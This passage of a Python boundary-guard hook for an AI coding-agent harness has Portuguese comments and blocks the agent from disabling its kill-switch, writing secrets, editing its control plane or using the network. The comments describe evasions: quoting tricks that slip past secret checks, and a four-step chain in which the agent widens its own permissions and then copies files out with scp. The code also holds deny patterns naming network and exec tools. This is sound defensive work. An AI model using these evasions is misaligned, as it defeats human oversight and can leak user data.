    exige sufixo exato (`.endswith(".env")`), então `".env"`/`'.env'` (com
    aspas) escapava do floor enquanto `.env` (sem aspas) era pego
    corretamente. `tee` já não tinha esse bug porque usava
    `_tokenize_command` (que trata aspas como separador, removendo-as). Fix:
    o ramo de redirecionamento agora tokeniza o comando (mesma função,
    mesma remoção de aspas) em vez de usar regex sobre o texto bruto —
    consistente com o ramo `tee` logo abaixo, e sem o furo de aspas.

    LIMITE ACEITO (não corrigido aqui — ver docstring do módulo, mesma
    lista de limitações assumidas do floor): a tokenização por
    `_tokenize_command` cobre o caso comum de aspas ENVOLVENDO o valor
    inteiro (`> ".env"`, `> '.env'`), mas NÃO reconstrói o shell parsing
    completo — concatenação de fragmentos entre aspas adjacentes (`>
    ".e"nv`, que o shell reagrupa em `.env` mas aqui vira dois tokens
    `.e`+`nv`, nenhum casando `is_floor_secret_path`) e ANSI-C quoting
    (`> $'\\x2eenv'`) ainda escapam. Mesma classe de risco residual que a
    escrita indireta via interpretador (`python -c "open('.env','w')"`):
    o floor cobre o vetor comum e observável, não é airtight contra um
    agente deliberadamente adversário ofuscando o alvo."""
    command = command or ""
    tokens = _tokenize_command(command)
    if ">" in command and any(is_floor_secret_path(tok) for tok in tokens):
        return True
    if "tee" in tokens:
        idx = tokens.index("tee")
        return any(is_floor_secret_path(tok) for tok in tokens[idx + 1:])
    return False


# ---------------------------------------------------------------------------
# Floor do kill-switch (Python real, IMPORTÁVEL) — nega o AGENTE se
# auto-desativar. Enquanto o harness está ativo (sentinel ausente), criar o
# sentinel `.harness/harness.disabled` ou rodar `harness disable` é DENY
# incondicional (precede a checagem de contrato, como os demais floors). Sem
# paradoxo com o short-circuit de `main()`: quando o sentinel EXISTE, `main()`
# já devolveu allow antes de chegar aqui — estes denies só rodam com o harness
# ativo. Residual idêntico ao floor de segredo (não persegue escrita indireta
# via interpretador — ver `is_floor_bash_secret_redirect`). O USUÁRIO roda
# `harness disable` no terminal próprio, fora do Claude Code, sem hook nenhum.
# ---------------------------------------------------------------------------
DISABLE_SENTINEL_BASENAME = "harness.disabled"
FLOOR_DISABLE_SEQUENCES: list[list[str]] = [
    ["harness", "disable"],
    ["python", "-m", "harness.cli", "disable"],
]


def is_floor_disable_sentinel_path(path: str) -> bool:
    """True se `path` aponta para o sentinel de kill-switch
    (`.harness/harness.disabled`). Match por nome-base (mesma postura de
    `is_floor_secret_path`): `harness.disabled` é nome distintivo, então cobre
    tanto o path relativo do `_evaluate_file` quanto o alvo de um
    redirecionamento, com ou sem prefixo de diretório."""
    lower = (path or "").replace("\\", "/").lower()
    return lower.rsplit("/", 1)[-1] == DISABLE_SENTINEL_BASENAME


def is_floor_disable_command(command: str) -> bool:
    """True se `command` invoca `harness disable` (ou `python -m harness.cli
    disable`) — as duas formas documentadas, mesmo padrão de
    `FIXED_HARNESS_SEQUENCES`. `enable`/`status` NÃO casam (re-ativar é
    inofensivo; status é read-only)."""
    tokens = _tokenize_command(command)
    return any(_has_sequence(tokens, seq) for seq in FLOOR_DISABLE_SEQUENCES)


def is_floor_bash_disable_redirect(command: str) -> bool:
    """True se `command` redireciona (`>`/`>>`) ou usa `tee` para criar o
    sentinel de kill-switch — espelha `is_floor_bash_secret_redirect`, trocando
    só o matcher do alvo por `is_floor_disable_sentinel_path`."""
    command = command or ""
    tokens = _tokenize_command(command)
    if ">" in command and any(is_floor_disable_sentinel_path(tok) for tok in tokens):
        return True
    if "tee" in tokens:
        idx = tokens.index("tee")
        return any(is_floor_disable_sentinel_path(tok) for tok in tokens[idx + 1:])
    return False


_PS_NETWORK_PATTERN = re.compile(r"(?i)\b(invoke-webrequest|invoke-restmethod|iwr|irm)\b")
_PS_WRITE_CMDLET_PATTERN = re.compile(r"(?i)\b(set-content|out-file|add-content)\b")
_PS_WRITEALLTEXT_PATTERN = re.compile(
    r"(?i)writealltext|writealllines|appendalltext|appendalllines"
)


def is_floor_powershell_network(command: str) -> bool:
    """True se `command` (PowerShell) casa o floor de rede/publicação:
    reusa `is_floor_bash_command` (git push/curl/wget/npm publish/pip
    upload/twine upload/gh release — tokenização genérica, independente de
    shell — NÃO duplicada aqui) e acrescenta os cmdlets de rede nativos do
    PowerShell que essa tokenização não reconhece como sequência fixa
    (`Invoke-WebRequest`/`Invoke-RestMethod` e os aliases `iwr`/`irm`)."""
    if is_floor_bash_command(command):
        return True
    return bool(_PS_NETWORK_PATTERN.search(command or ""))


def is_floor_powershell_secret_write(command: str) -> bool:
    """True se `command` (PowerShell) PARECE escrever em arquivo (via
    `Set-Content`/`Out-File`/`Add-Content`/redirecionamento `>`,`>>`/
    `[IO.File]::WriteAllText` e variantes — `WriteAllLines`/`AppendAllText`/
    `AppendAllLines`) E algum token do comando casa `is_floor_secret_path`.

    Heurística CONSERVADORA por design: escaneia TODOS os tokens do comando
    (não tenta parsing posicional exato do argumento de path — PowerShell
    aceita `-Path`, forma posicional, ou pipeline; um parser completo é fora
    de escopo). Prefere falso-deny a falso-allow neste caminho de floor de
    segredo — over-deny aqui é seguro (só gera fricção), nunca abre um
    bypass."""
    command = command or ""
    is_write = (
        _PS_WRITE_CMDLET_PATTERN.search(command) is not None
        or _PS_WRITEALLTEXT_PATTERN.search(command) is not None
        or ">" in command
    )
    if not is_write:
        return False
    return any(is_floor_secret_path(tok) for tok in _tokenize_command(command))


# ---------------------------------------------------------------------------
# Superfície de docs dedicada (Python real, IMPORTÁVEL) — Item 4 do backlog
# de correção do issue #1. Allowlist fixa restrita a `docs/**`, análoga à
# exceção já existente `WORK_DIR_PREFIX` (`.harness/work/**`), sem
# `verify_cmd` nem gate de aprovação — mas com exclusão EXPLÍCITA
# (defense-in-depth) dos documentos de governança, mesmo que nenhum deles
# more fisicamente dentro de `docs/**` hoje (todos vivem na raiz ou em
# `.harness/`, fora do prefixo `docs/`).
# ---------------------------------------------------------------------------
DOCS_SURFACE_DIR_PREFIX = "docs/"
DOCS_SURFACE_EXCLUDED_BASENAMES = frozenset({"agents.md", "claude.md", "plans.md", "spec.md"})
DOCS_SURFACE_EXCLUDED_PATHS = frozenset({".harness/harness.yaml"})


def _is_docs_surface_path(path: str) -> bool:
    """True se `path` (já `/`-separado) cai na allowlist fixa `docs/**`.

    Normaliza com `posixpath.normpath` ANTES de checar o prefixo `docs/` —
    protege contra um path que tente escapar de `docs/**` via segmentos
    `..` (ex.: `docs/../AGENTS.md` normaliza para `AGENTS.md`, que não
    começa com `docs/`). A exclusão por nome-base (`AGENTS.md`/`CLAUDE.md`/
    `Plans.md`/`spec.md`, case-insensitive) e por path exato
    (`.harness/harness.yaml`) é defense-in-depth adicional, redundante com a
    normalização acima no cenário atual, mas documentada explicitamente
    porque é a garantia que o backlog pede por escrito."""
    import posixpath

    normalized = posixpath.normpath(path or "")
    if normalized in DOCS_SURFACE_EXCLUDED_PATHS:
        return False
    basename = normalized.rsplit("/", 1)[-1].lower()
    if basename in DOCS_SURFACE_EXCLUDED_BASENAMES:
        return False
    return normalized.startswith(DOCS_SURFACE_DIR_PREFIX)


# ---------------------------------------------------------------------------
# Superfícies de work e scratch (Python real, IMPORTÁVEL) — garantia 4 do
# docstring do módulo. `.harness/work/**` (área de autoria do próximo
# contrato) já era sempre gravável, mas o check morava só no script standalone
# como `startswith` sobre o path bruto — sem normalização, um path com
# segmentos `..` (`.harness/work/../../qualquer.py`) escapava por traversal.
# `.harness/scratch/**` é a superfície nova para artefatos temporários de
# verificação (screenshots, dumps de rede, HTML de debug) que não pertencem a
# `files[]` de nenhuma tarefa. Ambos os checks normalizam com
# `posixpath.normpath` antes do prefixo, mesmo padrão de
# `_is_docs_surface_path` acima.
# ---------------------------------------------------------------------------
WORK_DIR_PREFIX = ".harness/work/"
SCRATCH_DIR_PREFIX = ".harness/scratch/"


def _is_work_surface_path(path: str) -> bool:
    """True se `path` (já `/`-separado) cai na área de autoria de contrato
    `.harness/work/**`. Normaliza com `posixpath.normpath` ANTES do prefixo —
    `.harness/work/../../x.py` normaliza para `x.py`, que não começa com o
    prefixo (correção do furo de traversal do check anterior)."""
    import posixpath

    normalized = posixpath.normpath(path or "")
    return normalized.startswith(WORK_DIR_PREFIX)


def _is_scratch_surface_path(path: str) -> bool:
    """True se `path` (já `/`-separado) cai na área de scratch
    `.harness/scratch/**` — artefatos temporários de verificação, sempre
    graváveis, auto-ignorados pelo git. Mesma normalização anti-traversal de
    `_is_work_surface_path`."""
    import posixpath

    normalized = posixpath.normpath(path or "")
    return normalized.startswith(SCRATCH_DIR_PREFIX)


# ---------------------------------------------------------------------------
# Floor do plano de controle (Python real, IMPORTÁVEL) — Item 0 do plano v2 da
# correção do dogfood venv-Windows. Escrita do AGENTE em `.harness/**` é
# deny INCONDICIONAL, com as duas exceções que já têm regra própria
# (`.harness/work/**` = autoria do próximo contrato, `.harness/scratch/**` =
# artefato temporário).
#
# Por que virou floor, e não mais uma checagem de superfície: até aqui o único
# gate sobre `.harness/harness.yaml` era a superfície do contrato ativo — e a
# superfície é ampliável pelo próprio agente via `harness task add-file`, que
# não validava path (ver `harness.contract.add_task_file`). Isso fechava uma
# cadeia de auto-ampliação de superfície de COMANDO, provada por execução
# contra o guard gerado do HEAD:
#
#   1. `harness task add-file T-01 .harness/harness.yaml`  -> allow
#   2. `Write .harness/harness.yaml`                       -> allow (era deny)
#   3. `harness compile-session`                           -> allow, re-bakeia
#   4. `scp <arquivo> user@host:/tmp`                      -> allow (era deny)
#
# Quatro tool calls, nenhum toque humano, e o floor de rede não é atravessado
# em nenhum passo — a exposição é exatamente tudo o que a denylist do floor não
# enumera (`ssh`, `scp`, `rsync`, `nc`, `docker run`, `certutil -urlcache`).
#
# A correção é deliberadamente em DUAS camadas: `add_task_file` recusa o path
# na entrada, e este floor recusa a escrita mesmo que o path entre na
# superfície por qualquer outra via (`files[]` legado de um Plans.md já
# compilado, edição manual do Plans.md, futura rota ainda não escrita). Uma
# camada só reproduziria o erro que criou o furo: uma peça defensável sozinha
# governando sozinha o plano de controle.
#
# O USUÁRIO continua editando `.harness/harness.yaml` no terminal próprio, fora
# do Claude Code, onde nenhum hook intercepta — mesma postura do kill-switch.
# ---------------------------------------------------------------------------
CONTROL_PLANE_DIR_NAME = ".harness"
CONTROL_PLANE_WRITABLE_DIRS = ("work", "scratch")
#: Arquivo ÚNICO de `.harness/` que o agente pode escrever. `progress.md` é
#: bookkeeping do próprio harness: o lifecycle (passo 12) manda atualizá-lo a
#: cada sessão e o `runtime_audit` dá warning se ausente — negá-lo tornaria o
#: produto contraditório consigo mesmo (é o issue 3 do dogfood venv-Windows, que a
#: exceção `_is_progress_file_path` existe para corrigir). Entrou como FILE, e
#: não como diretório em `CONTROL_PLANE_WRITABLE_DIRS`, porque a ampliação de
#: superfície fica de um arquivo nomeado: `.harness/progress.md/qualquer` e
#: `.harness/sub/progress.md` continuam deny.
CONTROL_PLANE_WRITABLE_FILES = ("progress.md",)


def is_floor_control_plane_path(path: str) -> bool:
    """True se `path` aponta para o plano de controle do harness
    (`.harness/**`) FORA das duas áreas com regra própria (`work/`, `scratch/`).

    Casa por SEGMENTO e case-INSENSITIVE, não por prefixo literal. As duas
    escolhas são correções do desenho anterior, que era prefixo
    case-sensitive e foi contornado em execução real:

    - **Caixa.** No Windows — plataforma exata do dogfood que originou este
      floor — `.Harness\\harness.yaml` e `.harness\\harness.yaml` são o MESMO
      arquivo. Com o predicado case-sensitive, trocar a caixa fazia
      `add_task_file` aceitar o path E o guard devolver `allow`, reabrindo a
      cadeia de auto-ampliação inteira. As duas camadas do Item 0 compartilham
      este predicado, então elas caíam juntas: não eram duas barreiras, eram
      uma barreira instanciada duas vezes. Lowercase incondicional (mesma
      postura de `is_floor_secret_path` e `is_floor_disable_sentinel_path`) —
      em POSIX isso nega um `.Harness/` que seria um diretório distinto e
      inofensivo, e esse falso-deny é o lado certo para errar num floor.
    - **Segmento.** `_evaluate_file` recebe o path já relativizado à raiz do
      repo, mas a relativização não acontece quando o path aponta para fora
      dela (outro drive, outro projeto). Um `C:/outro/.harness/harness.yaml`
      não tem o prefixo e escapava. Procurar o segmento `.harness` em qualquer
      posição cobre as duas formas com uma regra só.

    A conversão de `\\` para `/` vem ANTES do `normpath` (o anterior fazia
    depois): em POSIX o `normpath` não entende barra invertida como separador,
    então `.harness\\work\\..\\harness.yaml` não colapsava.

    As exceções são casadas no segmento SEGUINTE ao `.harness` — e só no
    primeiro `.harness` encontrado, que é o plano de controle do repo."""
    import posixpath

    normalized = posixpath.normpath((path or "").replace("\\", "/")).lower()
    segments = [s for s in normalized.split("/") if s not in ("", ".")]
    for index, segment in enumerate(segments):
        if segment == CONTROL_PLANE_DIR_NAME:
            rest = segments[index + 1:]
            if not rest:
                return True
            if rest[0] in CONTROL_PLANE_WRITABLE_DIRS:
                return False
            return not (len(rest) == 1 and rest[0] in CONTROL_PLANE_WRITABLE_FILES)
    return False


def _is_progress_file_path(path: str) -> bool:
    """True se `path` (já `/`-separado) é EXATAMENTE o `.harness/progress.md`
    canônico do repo — bookkeeping do próprio harness (o lifecycle, passo 12,
    manda o agente atualizá-lo a cada sessão; `runtime_audit` dá warning se
    ausente), sempre gravável. Match EXATO pós-`posixpath.normpath`,
    case-insensitive (filesystem Windows): um `progress.md` em qualquer outro
    diretório NÃO casa — nem em subdiretório de `.harness/`; a normalização
    cobre variantes como `docs/../.harness/progress.md`. Correção do issue 3
    do dogfood venv-Windows (guard negava escrita no arquivo que o próprio
    harness manda manter); a não-recursividade é deliberada e sobreviveu à
    mudança de caminho do item 6 — sem ela, qualquer `progress.md` plantado
    em subdiretório viraria buraco na superfície de escrita."""
    import posixpath

    normalized = posixpath.normpath(path or "")
    return normalized.lower() == PROGRESS_FILE_PATH


def _is_claude_memory_path(path: str) -> bool:
    """True se `path` aponta para o diretório de memória do Claude Code
    (`.claude/projects/<slug>/memory/...`) — sempre FORA de `repo_root` por
    design (mora em `~/.claude/projects/`), bookkeeping do próprio agente
    entre sessões, não arquivo do contrato ativo. Achado B do backlog de
    fricção do dogfood 2026-07-22: antes desta exceção, `_evaluate_file`
    tratava um path assim como "fora da superfície do contrato ativo" —
    mesma classe de deny genérico de um arquivo qualquer fora de `files[]` —
    travando toda escrita de memória enquanto um contrato estivesse ativo.

    Detecção por segmentos de path (sem regex — evita o escape de barra
    invertida que uma regex exigiria dentro do template standalone gerado
    por `render_boundary_guard()`), casa tanto `/` quanto `\\` como
    separador. Não valida que o `<slug>` seja não-vazio nem que o arquivo
    termine em `.md` — falso-negativo aqui só reintroduz o deny genérico
    (fail-safe), nunca abre um bypass novo."""
    normalized = (path or "").replace("\\\\", "/")
    parts = [p for p in normalized.split("/") if p]
    for i in range(len(parts) - 3):
        if parts[i] == ".claude" and parts[i + 1] == "projects" and parts[i + 3] == "memory":
            return True
    return False


# ---------------------------------------------------------------------------
# Utilitários shell read-only + `cd` intra-repo (Python real, IMPORTÁVEL) —
# itens 3 do parecer cético sobre os issues 1-2 do dogfood venv-Windows.
# Um segmento que NÃO prefixa nenhuma sequência permitida ainda pode passar
# se for (a) uso read-only aceito de um utilitário da allowlist fixa, ou
# (b) `cd` cujo alvo resolve para DENTRO da raiz do repo.
#
# "Read-only" aqui NÃO é prova universal — é allowlist de utilitários +
# denylist das flags de escrita/exec CONHECIDAS, com três guardas
# inegociáveis apontadas pelo parecer cético:
#   1. `find` tem flags que escrevem em arquivo SEM `>` (`-fprint`,
#      `-fprintf`, `-fprint0`, `-fls`) além das de exec
#      (`-delete`/`-exec`/`-execdir`/`-ok`/`-okdir`) — todas negadas;
#      `find . -fprint .env` furaria o floor de segredo.
#   2. `rg`/`grep` com `--pre`/`--pre-glob`/`--hostname-bin` executam
#      comando arbitrário por arquivo — negados (match exato ou `=`,
#      então `--pretty` continua liberado).
#   3. Redirecionamento de escrita nega o segmento, mas SÓ `>` fora de
#      aspas (`grep "->" src/` é rotina de busca de código e não pode
#      virar falso-deny) e ignorando duplicação de fd (`2>&1`, `1>&2`),
#      que não escreve arquivo. `>&arquivo` (redirect csh-style) nega.
#      Process substitution `<(`/`>(` também nega (executa comando).
#
# `cd` restrito ao repo não é paranoia: `FIXED_GIT_SEQUENCES` libera
# `git add`/`git commit` incondicionalmente — `cd <outro-repo> && git add .`
# operaria em OUTRO repositório. Alvo irresolvível estaticamente (`$VAR`,
# `~`, crase, vazio, `cd -`) ou âncora de repo_root ausente → não aceito
# (o deny genérico de superfície segue).
#
# Limite conhecido e ACEITO (documentado, não corrigido): o floor
# window-match roda antes e nega qualquer comando cujos tokens contenham
# palavra do floor — `grep -r "curl" src/` continua deny. Mexer no floor
# está fora de escopo por design.
# ---------------------------------------------------------------------------
READONLY_SHELL_UTILITIES = frozenset({
    "cat", "head", "tail", "wc", "grep", "rg", "ls", "echo", "find", "date",
})
FIND_WRITE_FLAGS = frozenset({
    "-delete", "-exec", "-execdir", "-ok", "-okdir",
    "-fprint", "-fprintf", "-fprint0", "-fls",
})
GREP_RG_EXEC_FLAGS = ("--pre", "--pre-glob", "--hostname-bin")
#: `date` LE o relogio (read-only) ate estas flags, que o ESCREVEM. Ajustar o
#: relogio do host e mudanca de configuracao de sistema, nao leitura. Mesmo
#: padrao de FIND_WRITE_FLAGS/GREP_RG_EXEC_FLAGS: utilitario de leitura com um
#: punhado de flags que o tornam destrutivo.
#:
#: `date` entrou na allowlist porque a skill `plan` EXIGE carimbar
#: `approved_at` com o timestamp ISO do momento da aprovacao humana, e nenhuma
#: rota de ler a hora era permitida - nem `date`, nem `python -c`. O agente
#: ficava sem como cumprir uma regra do proprio processo.
DATE_WRITE_FLAGS = ("-s", "--set")


def _is_grep_exec_flag(token: str) -> bool:
    """True se `token` é flag de exec do grep/rg (`--pre`, `--pre-glob`,
    `--hostname-bin`), em forma exata ou `--flag=valor`. `--pretty`/`-p`
    NÃO casam (match por igualdade/`=`, não por prefixo)."""
    for flag in GREP_RG_EXEC_FLAGS:
        if token == flag or token.startswith(flag + "="):
            return True
    return False


def _is_date_write_flag(token: str) -> bool:
    """True se `token` é flag do `date` que ESCREVE o relógio da máquina
    (`-s`, `--set`), em forma exata ou `--set=valor`. Match por igualdade/`=`
    e não por prefixo, senão `--iso-8601=seconds` seria confundido com escrita
    a cada carimbo de timestamp — o uso que motivou liberar o comando."""
    for flag in DATE_WRITE_FLAGS:
        if token == flag or token.startswith(flag + "="):
            return True
    return False


def _segment_has_file_redirect(segment: str) -> bool:
    """True se o segmento contém `>` de escrita em ARQUIVO fora de aspas.

    Duplicação de fd (`>` seguido de `&` + dígito: `2>&1`, `1>&2`) não
    conta — redireciona stream para stream, nenhum arquivo é escrito.
    `>> arquivo`, `> arquivo` e `>&arquivo` (csh-style, `&` sem dígito)
    contam. `>` DENTRO de aspas (`grep ">" f`, `grep "->" src/`) não conta
    — é padrão de busca, negá-lo seria fricção recorrente no caso de uso
    central da allowlist."""
    in_single = False
    in_double = False
    escape_next = False
    i = 0
    n = len(segment or "")
    while i < n:
        ch = segment[i]
        if escape_next:
            escape_next = False
        elif ch == "\\" and not in_single:
            escape_next = True
        elif ch == "'" and not in_double:
            in_single = not in_single
        elif ch == '"' and not in_single:
            in_double = not in_double
        elif ch == ">" and not in_single and not in_double:
            if i + 2 < n and segment[i + 1] == "&" and segment[i + 2].isdigit():
                i += 2  # `>&N` = duplicação de fd, segue
            else:
                return True
        i += 1
    return False


def _is_readonly_shell_segment(segment: str) -> bool:
    """True se o segmento é uso read-only ACEITO de um utilitário da
    allowlist (`READONLY_SHELL_UTILITIES`): primeiro token (basename, sem
    `.exe`) na allowlist, sem redirecionamento de escrita fora de aspas,
    sem process substitution, e sem as flags de escrita/exec conhecidas de
    `find`/`grep`/`rg`. Ver comentário do bloco acima para o racional e os
    limites."""
    seg = segment or ""
    if "<(" in seg or ">(" in seg:
        return False
    tokens = _tokenize_command(seg)
    if not tokens:
        return False
    head = tokens[0].replace("\\", "/").rsplit("/", 1)[-1].lower()
    if head.endswith(".exe"):
        head = head[:-4]
    if head not in READONLY_SHELL_UTILITIES:
        return False
    if _segment_has_file_redirect(seg):
        return False
    rest = [t.lower() for t in tokens[1:]]
    if head == "find" and any(t in FIND_WRITE_FLAGS for t in rest):
        return False
    if head in ("grep", "rg") and any(_is_grep_exec_flag(t) for t in rest):
        return False
    if head == "date" and any(_is_date_write_flag(t) for t in rest):
        return False
    return True


# ---------------------------------------------------------------------------
# Cmdlets read-only de pipeline (Python real, IMPORTÁVEL) — Item 7 do backlog
# do dogfood venv-Windows. `_evaluate_powershell` exigia que TODO
# segmento prefixasse alguma sequência permitida, e pipeline é a forma
# idiomática de PowerShell: `Select-Object`/`Where-Object` nunca vão prefixar
# uma allowlist derivada de `verify_cmd`. Na prática o caminho PowerShell era
# inutilizável sob contrato ativo — o que empurrava tudo para a Bash tool, que
# é justamente a que não enxerga o venv Windows.
#
# `ForEach-Object` (e os aliases `%`/`foreach`) fica DE FORA: executa
# scriptblock arbitrário, é execução, não formatação. `Invoke-Expression`/`iex`
# idem, pelo mesmo motivo, e nem se cogita. Atribuição a `$env:*` também fica
# de fora: muda o ambiente de execução dos comandos seguintes, e liberá-la
# reabriria por outra porta o problema de PATH que o Item 4 resolve de forma
# controlada (normalizando a FORMA de invocação, sem mexer no ambiente).
#
# O segundo grupo (cmdlets de ORIGEM, não de pipeline) corrige a assimetria
# entre os dois caminhos: o Bash tinha `cat`/`head`/`tail`/`ls`/`grep`/`echo`
# liberados por `READONLY_SHELL_UTILITIES`, mas o PowerShell não tinha os
# equivalentes — `Get-ChildItem` era deny mesmo COM contrato ativo. Quem só
# tem PowerShell 5.1 não conseguia nem listar um diretório sem declarar o
# comando no contrato. Cada entrada aqui é o análogo direto de uma entrada
# de `READONLY_SHELL_UTILITIES`, com os aliases nativos do PowerShell (que
# incluem os nomes POSIX: `cat`, `ls`, `echo`, `dir`, `type`, `pwd`).
# Continuam de fora os cmdlets `Set-*`/`New-*`/`Remove-*`/`Out-File`/`Add-*`
# e qualquer coisa que execute — e `_segment_has_file_redirect` já barra
# `Get-Content x > y` para todo o conjunto.
# ---------------------------------------------------------------------------
READONLY_PS_CMDLETS = frozenset({
    # cmdlets de pipeline (formatação/filtro)
    "select-object", "select",
    "where-object", "where", "?",
    "measure-object", "measure",
    "sort-object", "sort",
    "format-table", "ft",
    "format-list", "fl",
    "out-string",
    # cmdlets de origem (leitura), espelhando READONLY_SHELL_UTILITIES
    "get-content", "gc", "cat", "type",           # cat/head/tail
    "get-childitem", "gci", "ls", "dir",          # ls/find
    "select-string", "sls",                       # grep/rg
    "write-output", "write",                      # echo
    "get-location", "gl", "pwd",
    "get-item", "gi",
    "test-path",
})


def _is_readonly_ps_cmdlet_segment(segment: str) -> bool:
    """True se o segmento é um cmdlet read-only da allowlist
    (`READONLY_PS_CMDLETS`) — de pipeline ou de origem —, sem
    redirecionamento de escrita. Mesma postura de
    `_is_readonly_shell_segment`: allowlist de nome + denylist de escrita, não
    prova universal de inocuidade."""
    seg = segment or ""
    tokens = _tokenize_command(seg)
    if not tokens:
        return False
    if tokens[0].lower() not in READONLY_PS_CMDLETS:
        return False
    return not _segment_has_file_redirect(seg)


def _is_safe_cd_segment(segment: str, repo_root: str) -> bool:
    """True se o segmento é `cd <alvo>` com alvo que resolve para DENTRO de
    `repo_root`. Conservador: sem âncora de raiz, alvo vazio, `cd -`, ou
    alvo com `$`/`~`/crase (irresolvível estaticamente) → False. O alvo é o
    TEXTO após `cd` (aspas externas removidas), não a tokenização — path
    com espaço em Windows resolve certo. Comparação case-insensitive na
    plataforma que o exigir (`os.path.normcase`)."""
    import os

    if not repo_root:
        return False
    stripped = (segment or "").strip()
    if not (stripped == "cd" or stripped.startswith("cd ") or stripped.startswith("cd\t")):
        return False
    target = stripped[2:].strip()
    if not target or target == "-":
        return False
    if "$" in target or "`" in target or "~" in target:
        return False
    if len(target) >= 2 and target[0] == target[-1] and target[0] in ("'", '"'):
        target = target[1:-1].strip()
    if not target:
        return False
    target = target.replace("\\", "/")
    root = os.path.normcase(os.path.normpath(os.path.abspath(repo_root)))
    if os.path.isabs(target) or ":" in target.split("/", 1)[0]:
        candidate = target
    else:
        candidate = os.path.join(repo_root, target)
    candidate = os.path.normcase(os.path.normpath(os.path.abspath(candidate)))
    return candidate == root or candidate.startswith(root + os.sep)


# ---------------------------------------------------------------------------
# Âncora de raiz do repo (Python real, IMPORTÁVEL) — Item 6 do backlog de
# correção do issue #1 (deriva de `cwd`). Ver seção correspondente do
# docstring do módulo para a investigação (conclusão: cenário (b), FAIL-OPEN)
# e o mecanismo completo. `_MAX_ROOT_SEARCH_DEPTH` é só um teto de segurança
# contra loop (nunca deveria ser atingido na prática — a busca sempre para
# antes, ao alcançar a raiz do filesystem via `parent == current`).
# ---------------------------------------------------------------------------
_MAX_ROOT_SEARCH_DEPTH = 40


def _find_session_state_path(start_dir: Path | str) -> Path | None:
    """Sobe de `start_dir` até achar `SESSION_STATE_FILE`
    (`.harness/compiled-state-session.json`) ou até a raiz do filesystem —
    o que vier primeiro. Zero subprocess (ao contrário de `git rev-parse
    --show-toplevel`, a proposta original do issue: sem footgun de
    submódulo/worktree/repo-sem-git, e sem o custo de subprocess que o
    design deste módulo existe para evitar — docstring, linhas 3-8). Devolve
    o `Path` absoluto do arquivo se achar, `None` senão (inclui o caso de
    não achar dentro do limite de profundidade)."""
    current = Path(start_dir).resolve()
    for _ in range(_MAX_ROOT_SEARCH_DEPTH):
        candidate = current / SESSION_STATE_FILE
        if candidate.is_file():
            return candidate
        parent = current.parent
        if parent == current:
            return None
        current = parent
    return None


def _read_repo_root_from_state(state_path: Path | str) -> str | None:
    """Lê a chave `REPO_ROOT_STATE_KEY` de `state_path`
    (`compiled-state-session.json`). Devolve a string gravada se presente,
    não-vazia e apontando para um diretório que ainda existe em disco;
    `None` em qualquer outro caso (arquivo ausente, JSON inválido, chave
    ausente/tipo errado, ou diretório que não existe mais) — fallback
    seguro, nunca lança: o chamador deve cair no `cwd` do payload sem
    quebrar (repos sem `compile-session` recente não podem quebrar)."""
    path = Path(state_path)
    if not path.is_file():
        return None
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None
    if not isinstance(data, dict):
        return None
    root = data.get(REPO_ROOT_STATE_KEY)
    if not isinstance(root, str) or not root:
        return None
    if not Path(root).is_dir():
        return None
    return root


def _resolve_repo_root_anchor(script_file: Path | str) -> str | None:
    """Orquestrador: acha `SESSION_STATE_FILE` subindo a partir do diretório
    de `script_file` (o próprio hook instalado, via `__file__` — sempre mora
    em `<repo_root>/.harness/hooks/boundary_guard.py`, então subir a partir
    dali sempre alcança a raiz real do repo, mesmo que o `cwd` do payload
    tenha derivado) e devolve o `repo_root` válido gravado lá, ou `None` se
    qualquer passo falhar. `main()` usa o retorno para substituir o `cwd`
    efetivo ANTES de `_resolve_path`/`_load_json` — âncora os dois de uma
    vez, já que ambos recebem o mesmo `cwd`."""
    state_path = _find_session_state_path(Path(script_file).resolve().parent)
    if state_path is None:
        return None
    return _read_repo_root_from_state(state_path)


# ---------------------------------------------------------------------------
# Feature-lock em feature_list.json (Python real, IMPORTÁVEL). As funções de
# frescor de evidência/manifesto (`_parse_iso8601` até `_feature_by_id`
# abaixo) são embutidas no script standalone via `inspect.getsource()` — ver
# nota no docstring do módulo. O orquestrador (`evaluate_feature_list_edit`)
# e o veto do revisor (`_review_gate_problem`, mais abaixo) continuam com
# implementação própria em cada lado: dependem de `harness.review`
# (`ReviewError`, `load_review`, `is_test_diff`), que o hook standalone não
# pode importar.
# ---------------------------------------------------------------------------
FEATURE_LIST_RELATIVE_PATH = ".harness/feature_list.json"
EVIDENCE_DIR_NAME = ".harness/evidence"
UNSCOPED_EVIDENCE_DIR_NAME = "_sem-contrato"
TEAM_MANIFEST_RELATIVE_PATH = ".harness/team/manifest.json"


def _read_last_commit_timestamp(cwd: Path | str | None) -> str | None:
    """Mesmo padrão de subprocess de `session_start.py::_read_git_log`:
    `git log -1 --format=%cI` (timestamp ISO8601 do committer). Retorna
    `None` se o comando falhar (sem commits, não é repo git, git ausente)."""
    try:
        proc = subprocess.run(
            ["git", "log", "-1", "--format=%cI"],
            cwd=str(cwd) if cwd else None,
            capture_output=True,
            text=True,
            timeout=10,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    if proc.returncode != 0:
        return None
    output = proc.stdout.strip()
    return output or None


def _parse_iso8601(value: Any) -> datetime | None:
    if not isinstance(value, str):
        return None
    try:
        return datetime.fromisoformat(value.replace("Z", "+00:00"))
    except (ValueError, TypeError):
        return None


def _feature_passes_map(data: Any) -> dict[Any, bool]:
    result: dict[Any, bool] = {}
    if not isinstance(data, dict):
        return result
    for feat in data.get("features") or []:
        if not isinstance(feat, dict):
            continue
        fid = feat.get("id")
        if fid is not None:
            result[fid] = feat.get("passes") is True
    return result


def _contract_fully_passed(feature_list: Any) -> bool:
    """True se `feature_list` tem ao menos UMA feature e TODAS têm
    `passes: true` — contrato concluído. Reusa `_feature_passes_map` (mesma
    peça já usada por `_transitions_to_true`), sem ler `features` duas vezes
    com lógica divergente.

    Achado B do backlog de fricção do dogfood 2026-07-22: sem isto, o guard
    nunca se "aposentava" ao fim do contrato — `feature_list.json` 100%
    `passes:true` continuava restringindo a superfície de escrita/comando ao
    `files[]`/`verify_cmd` do contrato já ENCERRADO, e a única saída
    observada foi edição manual de `.claude/settings.json` pelo usuário
    (inclusive um caso de auto-proteção: o próprio guard negava editar o
    arquivo que o removeria). `_evaluate_file`/`_evaluate_bash`/
    `_evaluate_powershell` tratam este caso como equivalente a "sem contrato
    ativo" — mesma superfície aberta, floor (segredo/rede/push) continua
    incondicional, independente disto. `feature_list.json` VAZIO (`{}` ou
